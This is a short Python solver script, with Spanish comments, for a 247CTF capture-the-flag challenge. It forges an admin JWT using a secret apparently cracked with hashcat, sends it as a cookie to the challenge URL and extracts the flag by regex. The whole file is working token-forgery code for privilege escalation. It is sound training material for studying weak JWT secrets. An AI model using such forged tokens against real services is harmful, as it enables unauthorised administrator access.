#!/usr/bin/env python3
"""
247CTF - JWT Flag Authoriser Solver
"""

import jwt
import time
import requests

# Secreto crackeado con hashcat
SECRET = "wepwn247"
URL = "https://e2b6a2aca5431dce.247ctf.com/flag"

# Forjar token de admin
payload = {
    "csrf": "7d096a5b-1d19-474a-bde7-6d36dfb54287",
    "jti": "b3d522f5-3437-4c13-b93e-5e8d98119ec4",
    "exp": int(time.time()) + 3600,
    "fresh": False,
    "iat": int(time.time()),
    "type": "access",
    "nbf": int(time.time()),
    "identity": "admin"
}

admin_token = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"[+] Admin token forjado")

# Obtener flag
r = requests.get(URL, cookies={"access_token_cookie": admin_token})

import re
flag = re.search(r'247CTF\{[^}]+\}', r.text)
if flag:
    print(f"[+] Flag: {flag.group()}")
else:
    print("[-] Flag no encontrado")
    print(r.text)
